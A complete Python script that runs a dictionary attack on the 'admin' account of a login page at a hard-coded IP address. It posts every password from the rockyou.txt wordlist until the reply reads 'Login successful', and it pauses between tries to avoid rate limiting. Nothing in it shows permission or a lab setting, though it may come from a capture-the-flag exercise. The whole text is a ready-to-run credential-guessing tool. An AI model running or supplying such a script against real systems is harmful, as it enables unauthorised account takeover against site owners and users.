import requests
import time

# URL for the login page
url = 'http://72.14.191.236/under_development.php'

# Path to the wordlist file
wordlist_path = '/home/user/Desktop/rockyou.txt'

# Fixed username
username = 'admin'

try:
    with open(wordlist_path, 'r') as file:
        for line in file:
            password = line.strip()  # Read the password from the wordlist
            
            # Prepare the login data
            data = {'username': username, 'password': password}
            
            try:
                # Send a POST request to the login URL
                response = requests.post(url, data=data, timeout=10)
                
                # Check if the login was successful
                if 'Login successful' in response.text:
                    print(f'Valid login found: Username: {username}, Password: {password}')
                    break
                else:
                    print(f'Invalid login attempt: Password: {password}')
                
                # Optional: Add a small delay to avoid rate limiting
                time.sleep(1)
            
            except requests.RequestException as e:
                print(f"Error with request: {e}")
                continue

except FileNotFoundError:
    print("Wordlist file not found. Please check the path.")
